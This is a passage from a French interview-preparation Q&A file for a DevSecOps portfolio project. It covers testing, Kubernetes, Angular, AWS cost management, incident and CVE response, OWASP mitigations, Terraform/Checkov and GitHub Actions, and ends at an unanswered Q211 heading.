Outil Java : **PIT (Pitest)**. Score de mutation typique visé : >70%.

Différence avec la couverture de code : 100% de coverage avec `assertTrue(true)` ne détecte rien. Un bon score de mutation prouve que les tests testent réellement le comportement.

---

### Q163 — Qu'est-ce que le Chaos Engineering et comment l'implémenter ?

Le Chaos Engineering (popularisé par Netflix avec Chaos Monkey) consiste à introduire délibérément des pannes en production pour tester la résilience.

Exemples d'expériences :
- Tuer aléatoirement des instances EC2
- Injecter de la latence réseau entre services
- Remplir le disque
- Saturer la mémoire d'un container

Outils : AWS FIS (Fault Injection Simulator), Gremlin, Chaos Toolkit.

Prérequis : avoir un monitoring solide et des mécanismes de fallback avant de commencer le chaos.

---

### Q164 — Qu'est-ce que le Property-Based Testing ?

Contrairement aux tests basés sur des exemples (`assertEquals(2, add(1,1))`), le property-based testing génère des centaines d'inputs aléatoires et vérifie des propriétés invariantes.

Exemple pour une fonction de tri :
- Propriété : la liste résultante a la même longueur
- Propriété : chaque élément est ≤ au suivant
- Propriété : tous les éléments originaux sont présents

Outil Java : **jqwik**. Outil TypeScript : **fast-check**.

Intérêt : découvrir des edge cases que les exemples manuels ne couvrent pas (strings vides, nombres négatifs, Unicode).

---

### Q165 — Comment testez-vous les Kafka consumers dans ce projet ?

Pour tester les Kafka consumers sans Kafka réel, plusieurs approches :

1. **EmbeddedKafka** (Spring Test) : démarre un Kafka in-memory dans le test
```java
@EmbeddedKafka(topics = "portfolio.projects.created")
@SpringBootTest
class AuditEventConsumerTest { ... }
```

2. **Testcontainers** : démarre un vrai Kafka container Docker pendant le test. Plus lent mais identique à la prod.

3. **Test unitaire** : mocker le `KafkaTemplate`, tester la logique du consumer directement sans infrastructure Kafka.

Dans ce projet, les consumers sont simples (log + audit) → tests unitaires Mockito suffisent.

---

## Kubernetes Avancé

### Q166 — Qu'est-ce que le RBAC Kubernetes ?

RBAC (Role-Based Access Control) contrôle qui peut faire quoi dans le cluster.

Objets :
- **Role** : permissions dans un namespace (`get pods`, `list deployments`)
- **ClusterRole** : permissions cluster-wide
- **RoleBinding** : associe un Role à un User/ServiceAccount dans un namespace
- **ClusterRoleBinding** : associe un ClusterRole globalement

Dans ce projet, ArgoCD utilise un ServiceAccount avec les permissions minimales pour déployer dans les namespaces `portfolio-dev` et `portfolio-prod`. ESO a un ServiceAccount avec accès en lecture à Secrets Manager via IAM IRSA.

---

### Q167 — Qu'est-ce qu'une Network Policy Kubernetes ?

Les Network Policies définissent les règles de communication entre pods. Sans policy, tous les pods peuvent communiquer entre eux (zero trust absent).

Exemple : autoriser seulement le backend à parler à PostgreSQL :
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-backend-to-postgres
spec:
  podSelector:
    matchLabels: {app: postgres}
  ingress:
  - from:
    - podSelector:
        matchLabels: {app: portfolio-backend}
    ports: [{port: 5432}]
```

Nécessite un CNI supportant les Network Policies (Calico, Cilium). K3s utilise Flannel par défaut qui ne les supporte pas — il faudrait configurer Calico.

---

### Q168 — Qu'est-ce que Istio et le service mesh ?

Un service mesh est une couche d'infrastructure qui gère la communication entre microservices : mTLS automatique, observabilité, traffic management, circuit breaking.

**Istio** injecte un sidecar proxy (Envoy) dans chaque pod. Ce proxy intercepte tout le trafic entrant/sortant sans modifier le code applicatif.

Fonctionnalités : chiffrement mTLS service-à-service, retries automatiques, canary deployments (10% du trafic vers v2), distributed tracing.

Complexité élevée — justifié pour des dizaines de microservices. Pour ce portfolio, NGINX est suffisant.

---

### Q169 — Qu'est-ce que les Kubernetes Probes ?

Les probes permettent à Kubernetes de savoir si un pod est sain :

- **Liveness probe** : est-ce que l'application est vivante ? Si elle échoue, Kubernetes redémarre le container. Dans ce projet : `GET /actuator/health/liveness`.
- **Readiness probe** : est-ce que l'application est prête à recevoir du trafic ? Si elle échoue, le pod est retiré du Service Endpoints (plus de trafic). Dans ce projet : `GET /actuator/health/readiness`.
- **Startup probe** : est-ce que l'application a démarré ? Pendant le démarrage, ni liveness ni readiness ne sont vérifiées. Spring Boot avec Flyway peut prendre 60s — startup probe évite les kills prématurés.

---

### Q170 — Qu'est-ce qu'un Operator Kubernetes ?

Un Operator étend l'API Kubernetes avec des CRDs (Custom Resource Definitions) et implémente des controllers qui automatisent la gestion d'applications complexes.

Exemple : l'Operator PostgreSQL surveille les ressources `PostgresCluster`. Quand vous créez une instance, l'Operator crée automatiquement les Deployments, Services, PVCs, configure la réplication, gère les backups.

Dans ce projet, External Secrets Operator est un exemple : le CRD `ExternalSecret` est surveillé par le controller ESO qui synchronise avec Secrets Manager automatiquement.

---

## Angular Avancé

### Q171 — Qu'est-ce que le Server Side Rendering (SSR) Angular et quand l'utiliser ?

Angular Universal permet le rendu côté serveur. Avantages :

- **SEO** : les crawlers voient le HTML complet, pas un `<app-root>` vide
- **Performance perçue** : First Contentful Paint plus rapide (le HTML statique arrive immédiatement)
- **Réseaux lents** : le contenu visible avant que JS soit parsé

Désavantages : complexité d'infrastructure (Node.js server), hydration (risque de mismatch server/client).

Pour ce portfolio, le SEO n'est pas prioritaire (authentification requise pour la plupart des fonctionnalités). Une future évolution serait d'activer SSR pour la page `/portfolio` publique.

---

### Q172 — Qu'est-ce que le State Management dans Angular et quand utiliser NgRx ?

L'état applicatif est l'ensemble des données qui déterminent ce qu'affiche l'UI. Sans gestion centralisée, chaque composant gère son propre état → désynchronisation.

Solutions par complexité croissante :
1. **Signals** (Angular 16+) : état local d'un composant ou partagé via un service. Simple, performant.
2. **Services + Observables** : état partagé entre composants via `BehaviorSubject`. Ce projet utilise cette approche.
3. **NgRx** (Redux pattern) : Store centralisé, Actions, Reducers, Effects. Justifié pour des apps avec état global complexe (panier e-commerce, état de collaboration temps réel).

NgRx ajoute beaucoup de boilerplate — à éviter pour un portfolio CRUD relativement simple.

---

### Q173 — Comment optimisez-vous les performances Angular ?

Techniques appliquées dans ce projet :

- **`OnPush` Change Detection** : re-rendu uniquement sur changement de Signal/Input
- **Lazy loading** : feature modules chargés à la demande
- **`trackBy` dans les boucles** : `@for (p of projects; track p.id)` → Angular ne recrée pas les DOM nodes quand la liste change
- **Signals** : pas de `zone.js` pour les changements d'état locaux
- **Image optimization** : le bucket S3 + Lambda resize crée des miniatures WebP

Outils de mesure : Lighthouse, Angular DevTools, Chrome Performance profiler.

---

### Q174 — Qu'est-ce qu'un Angular Guard et ses différents types ?

Les guards contrôlent l'accès aux routes. Types disponibles :

- **`CanActivate`** (`CanActivateFn`) : peut-on activer cette route ? (authentification, permissions)
- **`CanDeactivate`** : peut-on quitter cette route ? (formulaire non sauvegardé → confirmation)
- **`CanLoad`** : peut-on charger le module lazy ? (vérifié avant le téléchargement)
- **`CanMatch`** : Angular 14+, version moderne de CanLoad
- **`Resolve`** : pré-charger les données avant d'afficher la route

Dans ce projet : `authGuard` (CanActivateFn) pour les routes authentifiées, `adminGuard` pour les routes admin.

---

### Q175 — Qu'est-ce que PWA (Progressive Web App) ?

Une PWA est une app web qui se comporte comme une app native :
- **Offline** : Service Worker met en cache les assets → fonctionne sans réseau
- **Installable** : peut être ajoutée à l'écran d'accueil du mobile
- **Push notifications** : même mécanisme qu'une app native
- **Background sync** : synchronise les données quand la connexion revient

Angular CLI génère une PWA avec `ng add @angular/pwa`. Ce projet n'est pas une PWA (pas de mode offline pertinent pour un portfolio admin).

---

## FinOps & Coûts Cloud

### Q176 — Qu'est-ce que le FinOps et en quoi concerne-t-il les DevOps ?

FinOps = Financial + DevOps. C'est la pratique de responsabiliser les équipes techniques sur les coûts cloud. Chaque équipe voit les coûts générés par ses services et les optimise.

Dans les grandes orgs cloud : les développeurs provisionnent des ressources sans visibility sur les coûts → factures AWS surprises. FinOps amène :
- Tagging systématique des ressources (tag `team`, `environment`, `project`)
- Dashboards de coûts par équipe/service
- Budgets et alertes
- Rightsizing régulier (supprimer les ressources sous-utilisées)

---

### Q177 — Qu'est-ce que les Reserved Instances et les Savings Plans AWS ?

Pour les charges stables et prévisibles, AWS propose des réductions en échange d'un engagement :

- **Reserved Instances** : engagement 1 ou 3 ans sur un type d'instance → jusqu'à 72% de réduction vs On-Demand
- **Savings Plans** : engagement de dépense ($/heure) → jusqu'à 66% de réduction, flexible sur le type d'instance

Pour ce portfolio : On-Demand est suffisant (trafic imprévisible, durée < 12 mois). Pour une startup avec un EC2 qui tourne 24/7, un Reserved Instance 1 an économiserait ~40%.

---

### Q178 — Comment identifiez-vous et supprimez-vous les ressources AWS inutilisées ?

Approche systématique :

1. **AWS Cost Explorer** : identifier les services avec des coûts inhabituels
2. **Trusted Advisor** : recommandations de rightsizing (EC2 sous-utilisé, EBS non attaché)
3. **CloudWatch métriques** : instances avec CPU < 5% pendant 14 jours → candidates à la suppression
4. **EBS orphelins** : volumes non attachés génèrent des coûts
5. **Elastic IPs non associées** : facturées si non attachées à une instance running
6. **ECR lifecycle policies** : sans policy, les anciennes images s'accumulent

Dans ce projet : ECR lifecycle (5 images max), EIP attachée à l'EC2, pas de ressources orphelines.

---

## Questions situationnelles avancées

### Q179 — L'application est lente en production. Comment déboguez-vous ?

Approche méthodique :

1. **Caractériser** : quelle page/endpoint ? Depuis quand ? Tous les utilisateurs ou certains ?
2. **Métriques** : Grafana → p95 latence, CPU, mémoire, connexions DB. Quel service est le goulot ?
3. **Logs** : CloudWatch Logs → erreurs corrélées ? Timeouts DB/Redis ?
4. **APM/Tracing** : si OpenTelemetry configuré → quel span est lent ?
5. **DB** : `EXPLAIN ANALYZE` sur les requêtes lentes. Index manquant ?
6. **Profiler** : si le problème est CPU → async-profiler pour identifier la méthode couteuse

Ne jamais optimiser sans mesurer d'abord (premature optimization).

---

### Q180 — Comment gérez-vous un incident P1 (production down) ?

Processus ITSM appliqué :

1. **Triage** (0-5 min) : confirmer l'impact, notifier les parties prenantes
2. **Communication** : status page, message Slack #incidents, informer le management
3. **Mitigation** (5-15 min) : rollback si dégradation récente, failover si possible
4. **Diagnostic** : logs, métriques, derniers changements (git log depuis 24h)
5. **Résolution** : fix ou contournement
6. **Post-mortem** (J+2) : timeline, RCA, actions préventives

Règle : **communiquer souvent**, même pour dire "pas encore de solution". Le silence est le pire.

---

### Q181 — Vous découvrez une CVE critique dans une dépendance en production. Que faites-vous ?

Processus de réponse :

1. **Évaluer** : est-ce que cette CVE est exploitable dans notre contexte ? (score CVSS, vecteur d'attaque, configuration)
2. **Patch disponible** ? Si oui : mettre à jour la dépendance, tests, déployer en urgence
3. **Pas de patch** : existe-t-il un workaround ? (désactiver une feature, WAF rule pour bloquer le vecteur)
4. **Communiquer** : informer l'équipe sécurité, le management
5. **Documenter** : qui a fait quoi, quand, pourquoi — utile pour la compliance

Prévention : Dependabot + alertes CVE en continu évitent les surprises.

---

### Q182 — Un développeur a committé une clé AWS dans Git. Que faites-vous ?

Actions immédiates (dans la minute) :

1. **Révoquer** la clé dans AWS IAM Console → Actions → Make inactive / Delete
2. **Vérifier** dans CloudTrail les API calls faits avec cette clé dans les 24h
3. **Nettoyer Git** : `git filter-branch` ou BFG Repo Cleaner pour supprimer la clé de l'historique
4. **Force-push** sur la branche (et avertir l'équipe)
5. **Générer** une nouvelle clé et la stocker correctement dans GitHub Secrets

Prévention : `git-secrets` ou `truffleHog` dans les pre-commit hooks + Trivy scan des repos. AWS a un système de détection automatique qui révoque les clés trouvées sur GitHub public.

---

### Q183 — Comment géreriez-vous la migration de base de données sans downtime ?

Technique : migration en plusieurs étapes avec compatibilité backward.

Étape 1 : ajouter la nouvelle colonne nullable (migration sans breaking change)
Étape 2 : déployer le code qui écrit dans les deux colonnes
Étape 3 : backfiller les données existantes
Étape 4 : ajouter la contrainte NOT NULL
Étape 5 : déployer le code qui lit la nouvelle colonne
Étape 6 : supprimer l'ancienne colonne

Flyway gère les étapes : chaque migration est un fichier numéroté. Les migrations sont idempotentes et irréversibles par conception.

---

### Q184 — Quelle est votre approche pour la sécurisation d'une API REST publique ?

Checklist appliquée :

1. **HTTPS uniquement** : HSTS header (`Strict-Transport-Security`)
2. **Authentification** : JWT, rotation des secrets
3. **Authorization** : RBAC granulaire, principe du moindre privilège
4. **Validation** : tout input validé avant traitement
5. **Rate limiting** : par IP ou par token
6. **CORS** : origins strictement définies
7. **Headers de sécurité** : `X-Content-Type-Options`, `X-Frame-Options`, `CSP`
8. **Logging** : tous les accès loggés avec requestId
9. **Dépendances** : scan CVE automatique
10. **Pentest** : OWASP ZAP ou équivalent en CI

---

### Q185 — Comment assurez-vous la continuité de service lors d'une mise à jour du schéma DB ?

Strategy "expand and contract" :

**Expand** (phase 1) : migration additive seulement.
- Ajouter une colonne nullable
- Ajouter une table
- Jamais renommer/supprimer directement

Déployer le code compatible avec l'ancien ET le nouveau schéma.

**Contract** (phase 2, sprint suivant) : nettoyer.
- Supprimer l'ancienne colonne maintenant inutilisée
- Rendre la colonne NOT NULL après backfill complet

Avantage : rollback possible à tout moment (l'ancien code fonctionne toujours avec le nouveau schéma).

---

## Tendances & Innovations

### Q186 — Qu'est-ce que le GitOps 2.0 et Flux vs ArgoCD ?

**Flux v2** et **ArgoCD** sont les deux leaders GitOps CNCF. Comparaison :

| | ArgoCD | Flux v2 |
|--|--------|---------|
| UI | Web UI complète | Dashboards Weave |
| Multi-tenant | Projets isolés | Kustomizations |
| Multi-cluster | Oui natif | Oui via providers |
| Notifications | Intégrées | Via Notification Controller |
| Apprentissage | Plus facile | Plus "Kubernetes-native" |

Ce projet utilise ArgoCD pour l'App of Apps pattern, l'UI de visualisation, et la compatibilité Helm + Kustomize.

---

### Q187 — Qu'est-ce que l'eBPF et son impact sur l'observabilité ?

eBPF (Extended Berkeley Packet Filter) permet d'exécuter des programmes sandboxés dans le kernel Linux sans modifier le code source des applications.

Impact sur l'observabilité :
- **Cilium** : networking K8s + observabilité réseau basée eBPF (remplace iptables)
- **Pixie** : monitoring applicatif automatique sans instrumentation de code (trace les syscalls)
- **Falco** : détection d'anomalies de sécurité en temps réel (ex: container qui exécute `bash`)

Avantage clé : observer des applications sans les modifier (auto-instrumentation), overhead minimal.

---

### Q188 — Qu'est-ce que le concept de "Platform as a Product" ?

L'équipe Platform (infra, DevOps) se comporte comme une équipe produit dont les clients sont les équipes développement.

Implications :
- **Roadmap** : priorisation basée sur les besoins des équipes (pas sur la techno pour la techno)
- **UX** : l'Internal Developer Platform doit être facile à utiliser (Developer Experience)
- **SLA** : l'équipe Platform a des engagements de disponibilité envers ses clients internes
- **Feedback** : NPS interne, interviews des développeurs
- **Self-service** : moins de tickets "ouvrir-moi-un-port", plus de portails en libre-service

---

### Q189 — Qu'est-ce que Wasm (WebAssembly) dans le contexte cloud/backend ?

WebAssembly est un bytecode portable s'exécutant dans les navigateurs. Dans le cloud, WASI (WebAssembly System Interface) permet d'exécuter du Wasm côté serveur.

Applications DevOps/cloud :
- **Plugins Envoy** : filtres HTTP personnalisés en Wasm (vs C++ complexe)
- **Serverless edge** : CloudFlare Workers exécute du Wasm à la périphérie réseau
- **Sécurité** : sandboxing plus fort que les containers pour l'exécution de code untrusted

Encore émergent pour les backends traditionnels, mais à surveiller pour les edge functions.

---

### Q190 — Qu'est-ce que la Software Supply Chain Security ?

La supply chain d'un logiciel inclut tous les composants tiers : bibliothèques, images base, outils CI/CD, pipelines. Une compromission de la supply chain peut injecter du code malveillant dans des milliers d'applications (ex: SolarWinds, Log4Shell).

Mesures appliquées dans ce projet :
- **SBOM** (CycloneDX) : inventaire complet des composants
- **Cosign** : signature cryptographique des images Docker
- **Dependabot** : mise à jour automatique des dépendances vulnérables
- **SLSA (Supply chain Levels for Software Artifacts)** : framework de bonnes pratiques
- **Pinning des versions** : images Docker avec SHA digest fixe plutôt que `:latest`

---

## Questions finales

### Q191 — Expliquez OWASP Top 10 et lesquels avez-vous adressés ?

Le Top 10 OWASP liste les vulnérabilités web les plus critiques :

| Vuln | Mitigation dans ce projet |
|------|--------------------------|
| A01 Broken Access Control | RBAC Spring Security, `@PreAuthorize` |
| A02 Cryptographic Failures | HTTPS, BCrypt, chiffrement at-rest RDS |
| A03 Injection | JPA paramétré, Bean Validation |
| A04 Insecure Design | Threat modeling, defense in depth |
| A05 Security Misconfiguration | Security headers, SG restrictif |
| A06 Vulnerable Components | Dependabot, OWASP Dependency Check |
| A07 Auth Failures | JWT, BCrypt cost 12, brute-force alerting |
| A08 Integrity Failures | Cosign image signing, SBOM |
| A09 Logging Failures | Logs JSON structurés, CloudTrail |
| A10 SSRF | Validation des URLs, pas de proxy interne |

---

### Q192 — Qu'est-ce que le Zero Trust Security Model ?

Zero Trust = "Ne jamais faire confiance, toujours vérifier". Opposé au modèle "castle and moat" (périmètre sécurisé + confiance interne).

Principes :
1. Vérifier explicitement l'identité à chaque accès (pas de "déjà dans le réseau = de confiance")
2. Principe du moindre privilège (accès minimal nécessaire)
3. Assumer la compromission (surveiller le trafic interne)

Dans ce projet : même les services internes (backend → RDS) utilisent SSL + credentials. L'IAM Role EC2 a des permissions minimales. Les Network Policies K8s limiteraient le trafic pod-à-pod.

---

### Q193 — Qu'est-ce que l'Infrastructure Immutable ?

L'infra immutable = une fois déployée, une instance n'est jamais modifiée. Pour changer la configuration : on construit une nouvelle image et on remplace l'ancienne.

Avantages :
- Pas de "snowflake servers" (serveurs uniques avec configurations manuelles accumulées)
- Déploiements reproductibles
- Facilite le rollback (garder l'ancienne image)

Dans ce projet : les images Docker sont immutables (tag SHA). L'EC2 user-data est exécuté une seule fois. En revanche, la configuration docker-compose.yml est modifiable (pas totalement immutable) — une amélioration serait de rebuilder l'AMI EC2 à chaque changement de config.

---

### Q194 — Qu'est-ce qu'un Runbook et comment en écrivez-vous un ?

Un Runbook est un document qui décrit les procédures opérationnelles : comment démarrer/arrêter un service, investiguer une alarme, effectuer une maintenance.

Structure d'un bon Runbook :
1. **Nom de l'alerte** : "CPU EC2 > 80% pendant 5 min"
2. **Symptômes** : latence augmentée, timeouts
3. **Impact** : utilisateurs affectés
4. **Actions immédiates** : vérifier les containers, les logs
5. **Investigation** : `docker stats`, top, CloudWatch
6. **Remédiation** : restart backend, scale up, identifier la requête lourde
7. **Escalade** : contacter X si non résolu en 30 min

---

### Q195 — Comment auditez-vous les accès AWS ?

Trois outils complémentaires :

1. **CloudTrail** : toutes les API calls avec qui/quand/où. Requêtable via Athena.
2. **AWS Config** : état de configuration des ressources dans le temps. Règles de conformité.
3. **Access Analyzer** : identifie les ressources accessibles depuis l'extérieur (S3 publics, rôles IAM trop permissifs)

Pour la compliance (SOC 2, ISO 27001) : exporter CloudTrail vers S3 + Glacier avec un verrou d'objet (Write Once Read Many) pour l'immuabilité des logs d'audit.

---

### Q196 — Qu'est-ce que le principe de "Configuration as Code" ?

Toute configuration d'infrastructure, de pipeline, de monitoring est définie dans des fichiers versionés dans Git — pas de configuration manuelle via une UI.

Dans ce projet :
- Infrastructure → Terraform (`.tf`)
- Pipelines CI/CD → GitHub Actions (`.yml`)
- Dashboards Grafana → JSON provisionnés automatiquement
- Alertes → CloudWatch (Terraform)
- K8s manifests → Helm + Kustomize
- Certificats → Certbot config

Avantage : une démo "from scratch" = `git clone` + `terraform apply` + quelques commandes.

---

### Q197 — Quelles certifications AWS recommanderiez-vous pour un DevSecOps ?

Parcours recommandé :

1. **AWS Cloud Practitioner** (niveau fondations) : compréhension globale des services AWS
2. **AWS Solutions Architect Associate** : concevoir des architectures AWS robustes
3. **AWS DevOps Engineer Professional** : CI/CD, IaC, monitoring
4. **AWS Security Specialty** : IAM, KMS, Macie, GuardDuty, WAF

Complémentaires :
- **CKA** (Certified Kubernetes Administrator) : indispensable pour K8s en prod
- **CKS** (Certified Kubernetes Security Specialist) : sécurité K8s
- **HashiCorp Terraform Associate** : Terraform best practices

---

### Q198 — Comment présenteriez-vous ce projet en 2 minutes à un non-technique ?

"J'ai construit une application web complète déployée sur le cloud d'Amazon, accessible à l'adresse charrad-devsecops.duckdns.org. Ce n'est pas juste une app — c'est tout le cycle de vie d'un logiciel professionnel :

- L'app elle-même : une interface Angular moderne reliée à une API Java, avec une base de données PostgreSQL
- La sécurité : tests automatiques qui détectent les failles, les données sont chiffrées, les accès sont contrôlés
- Le déploiement automatique : quand je modifie le code, en 8 minutes c'est en production — sans intervention manuelle
- Le monitoring : tableaux de bord Grafana qui montrent en temps réel si l'app est saine

Le tout en Free Tier AWS : ~$0/mois pendant 12 mois."

---

### Q199 — Quelle est selon vous la compétence la plus importante d'un DevSecOps engineer ?

La **capacité à voir le système dans son ensemble** — comprendre comment le code, l'infrastructure, la sécurité et les opérations s'interconnectent, et comment un changement dans une couche impacte les autres.

Techniquement, les outils changent vite (le Kubernetes d'aujourd'hui n'est pas celui de demain). Mais comprendre pourquoi on fait des tests, pourquoi on automatise, pourquoi on monitore — ces principes sont permanents.

Humainement : la communication. Un incident à 3h du matin se résout mieux avec une équipe qui communique clairement qu'avec la meilleure stack technique du monde.

---

### Q200 — Pourquoi vous plutôt qu'un autre candidat ?

Ce portfolio répond directement à cette question :

1. **Je construis, je ne théorise pas** : 21 phases implémentées, toutes commitées et déployées. Chaque technologie citée dans le CV est visible dans le code et en production.

2. **Je comprends les compromis** : K3s vs Docker Compose, t3.micro vs t3.small, Free Tier vs performance. Les décisions sont documentées avec les raisons, pas juste la solution retenue.

3. **Je pense sécurité dès le début** : SAST, DAST, SBOM, IAM least privilege — pas un audit de sécurité à la fin.

4. **Je suis autonome** : ce projet a été construit de zéro, de l'architecture à la production, en autonomie complète.

5. **Je documente** : les questions d'entretien que vous me posez ont leurs réponses dans `docs/INTERVIEW-QUESTIONS.md` — parce que je pense toujours à la transmission et à la maintenabilité.

---

## GSAP & UX Animations (Phase 22)

### Q201 — Qu'est-ce que GSAP et ScrollTrigger, et comment les avez-vous intégrés dans Angular ?

GSAP (GreenSock Animation Platform) est la bibliothèque JavaScript d'animation la plus utilisée en production — elle surpasse les animations CSS pour les scénarios complexes (synchronisation, timeline, scrubbing).

**ScrollTrigger** est un plugin GSAP qui lie les animations au défilement de la page (scroll position ou scroll velocity). Dans ce projet (Phase 22) :

1. `npm install gsap` — GSAP est tree-shakable, seuls les modules utilisés sont bundlés
2. `gsap.registerPlugin(ScrollTrigger)` dans `ngOnInit` ou via un service singleton
3. Les animations sont créées dans `ngAfterViewInit` (le DOM doit être prêt) avec `@ViewChild` pour cibler les éléments

Exemple concret — effet d'apparition des cartes projet :
```typescript
ngAfterViewInit() {
  gsap.from(this.cards.nativeElement.querySelectorAll('.card'), {
    scrollTrigger: {
      trigger: this.cards.nativeElement,
      start: 'top 80%',
      toggleActions: 'play none none reverse'
    },
    y: 60, opacity: 0, stagger: 0.15, duration: 0.8, ease: 'power2.out'
  });
}
```

**Nettoyage obligatoire** dans `ngOnDestroy` :
```typescript
ngOnDestroy() {
  ScrollTrigger.getAll().forEach(st => st.kill());
}
```

---

### Q202 — Quels problèmes de performance faut-il éviter avec GSAP dans Angular ?

Deux pièges principaux :

1. **Animations hors zone Angular** : GSAP modifie le DOM en dehors du `NgZone`. Avec `ChangeDetectionStrategy.OnPush`, appeler GSAP via `ngZone.runOutsideAngular(() => { ... })` évite des cycles de détection inutiles. Pour déclencher un re-rendu si nécessaire : `ngZone.run(() => { ... })`.

2. **Fuite mémoire ScrollTrigger** : chaque `ScrollTrigger` crée des event listeners sur le scroll. Sans `kill()` dans `ngOnDestroy`, ils persistent même après destruction du composant → fuite mémoire sur les Single Page Apps avec routing. Pattern sûr : stocker les triggers dans un tableau et les tuer tous.

3. **Performances de paint** : préférer les propriétés `transform` (GPU-composited) et `opacity` aux propriétés qui déclenchent un reflow (`width`, `height`, `top`, `left`). GSAP utilise `will-change: transform` automatiquement.

---

### Q203 — Quelle est la différence entre les animations CSS et GSAP ? Quand choisir l'un ou l'autre ?

| | CSS Animations/Transitions | GSAP |
|--|--------------------------|------|
| Syntaxe | Déclarative (`.scss`) | Impérative (JS/TS) |
| Séquençage | Limité (`animation-delay`) | Timeline complète |
| Scrubbing | Impossible | Natif (`scrub: true`) |
| Callbacks | Non | `onComplete`, `onUpdate` |
| Performance | Excellente (GPU natif) | Excellente (optimisé GPU) |
| Interactivité | Limitée | Totale (pause, reverse, seek) |

**Règle de décision** :
- Hover, focus, transition simple → **CSS** (plus performant, aucune dépendance)
- Animation synchronisée au scroll, timeline multi-étapes, storytelling → **GSAP**
- Angular Animations (enter/leave) → bon compromis pour les transitions de routes

Dans ce projet, la navigation et les micro-interactions utilisent CSS, les animations de scroll (Phase 22) utilisent GSAP.

---

## Angular Avancé (suite)

### Q204 — Qu'est-ce que le bloc `@defer` Angular et dans quels cas l'utiliser ?

`@defer` (Angular 17+) est un mécanisme de chargement différé au niveau du template. Contrairement au lazy loading des routes, il diffère le chargement d'un composant individuel.

```html
@defer (on viewport) {
  <app-heavy-chart />
} @placeholder {
  <div class="skeleton-chart"></div>
} @loading {
  <app-spinner />
} @error {
  <p>Impossible de charger le graphique.</p>
}
```

Déclencheurs disponibles :
- `on viewport` : quand l'élément entre dans le viewport (IntersectionObserver)
- `on interaction` : au clic/focus
- `on idle` : quand le navigateur est inactif
- `on timer(2s)` : après un délai
- `when condition` : sur une expression booléenne

**Cas d'usage dans ce projet** : les graphiques Grafana embarqués ou les cartes de projets hors écran. `@defer (on viewport)` améliore le LCP et réduit le bundle initial.

---

### Q205 — Qu'est-ce que le mode "Zoneless" Angular et quel est son intérêt ?

Depuis Angular 18, il est possible de désactiver `zone.js` complètement. `zone.js` interceptait tous les events asynchrones (setTimeout, HTTP, événements DOM) pour déclencher la détection de changement — un patch global lourd (~30kb).

Sans `zone.js` :
- La détection de changement est **manuelle ou basée sur les Signals**
- Bundle réduit de ~30kb
- Performances améliorées (pas de patching de toutes les APIs async)
- Meilleure compatibilité avec les web workers

Configuration dans ce projet :
```typescript
// app.config.ts
provideExperimentalZonelessChangeDetection()
```

**Prérequis** : tous les composants doivent être en `ChangeDetectionStrategy.OnPush` et utiliser des Signals ou `markForCheck()` pour déclencher les mises à jour. Ce projet remplit ces conditions.

---

## Terraform Avancé

### Q206 — Qu'est-ce que les Terraform Workspaces et quand les utiliser ?

Les workspaces Terraform permettent d'avoir plusieurs états (`terraform.tfstate`) distincts à partir du même code Terraform.

```bash
terraform workspace new staging
terraform workspace select prod
terraform apply  # déploie dans le workspace actif
```

Chaque workspace a son propre state — idéal pour des environnements similaires (dev/staging/prod) avec des variables différentes.

**Limitations** : les workspaces partagent le même backend — un `terraform destroy` mal ciblé peut impacter le mauvais environnement. Alternative recommandée pour de vraies isolations : **comptes AWS séparés** par environnement (AWS Organizations), avec un state backend S3 dédié par compte.

Dans ce projet : pas de workspaces (portfolio solo). En entreprise : workspace ou comptes séparés + modules réutilisables.

---

### Q207 — Qu'est-ce que Checkov et comment l'utilisez-vous pour sécuriser Terraform ?

Checkov est un scanner d'IaC (Infrastructure as Code) statique. Il analyse les fichiers Terraform (et CloudFormation, K8s, Dockerfile) avant l'apply pour détecter des misconfiguraitons de sécurité.

```bash
checkov -d terraform/ --framework terraform
```

Exemples de règles vérifiées :
- `CKV_AWS_57` : S3 bucket avec versioning désactivé
- `CKV_AWS_24` : Security Group avec port 22 ouvert à 0.0.0.0/0
- `CKV_AWS_28` : RDS sans backup automatique
- `CKV_AWS_8` : EC2 sans instance metadata service v2 (IMDSv2)

Dans le CI/CD, Checkov s'intègre comme étape pré-deploy :
```yaml
- name: Checkov IaC Scan
  uses: bridgecrewio/checkov-action@v12
  with:
    directory: terraform/
    soft_fail: true  # false en production
```

---

## API Design

### Q208 — Quelles stratégies de versioning d'API REST connaissez-vous ? Laquelle avez-vous choisie ?

Quatre approches :

1. **URL path** : `/api/v1/projects` → la plus visible et la plus cacheable. Recommandée pour les APIs publiques.
2. **Query parameter** : `/api/projects?version=1` → simple mais non-standard.
3. **Header** : `Accept: application/vnd.portfolio.v1+json` → propre, invisible dans l'URL, moins cacheable.
4. **Subdomain** : `v1.api.example.com` → infrastructure plus complexe.

Dans ce projet : versioning par **URL path** (`/api/v1/...`). Avantages : visible dans les logs, directement testable avec curl, compatible avec les gateways et proxies standard.

**Règle** : ne pas versionner prématurément — une API interne à un seul client n'a pas besoin de versioning. Versionner quand des clients tiers dépendent de l'API.

---

### Q209 — Comment Spring Boot génère-t-il la spec OpenAPI et comment la personnalisez-vous ?

Spring Boot + `springdoc-openapi-ui` génère automatiquement la spec OpenAPI 3 à partir des annotations Spring :

```java
// pom.xml
<dependency>
  <groupId>org.springdoc</groupId>
  <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
</dependency>
```

La spec est disponible sur `/v3/api-docs` (JSON) et `/swagger-ui.html` (UI interactive).

Personnalisations appliquées :
```java
@Operation(summary = "Créer un projet", security = @SecurityRequirement(name = "Bearer"))
@ApiResponse(responseCode = "201", description = "Projet créé")
@ApiResponse(responseCode = "400", description = "Données invalides")
public ResponseEntity<ProjectResponse> createProject(@Valid @RequestBody ProjectRequest request)
```

Dans ce projet, la spec OpenAPI est la cible du scan ZAP DAST — c'est pourquoi elle est exposée (en prod, la désactiver ou la protéger derrière un SG).

---

## GitHub Actions Avancé

### Q210 — Qu'est-ce que les GitHub Actions Environments et les protection rules ?

Les Environments permettent de définir des règles de déploiement par cible (dev, staging, prod).

**Protection rules disponibles** :
- **Required reviewers** : un humain doit approuver avant le déploiement
- **Wait timer** : délai obligatoire entre le push et le déploiement
- **Deployment branches** : seule la branche `main` peut déployer en prod

```yaml
jobs:
  deploy-prod:
    environment:
      name: production
      url: https://charrad-devsecops.duckdns.org
    runs-on: ubuntu-latest
```

Dans ce projet, `deploy-app.yml` utilise un environment `production`. En équipe, on y ajouterait 2 reviewers obligatoires avant tout déploiement production — audit trail complet dans GitHub.

---

### Q211 — Qu'est-ce que les GitHub Actions Reusable Workflows et Composite Actions ?

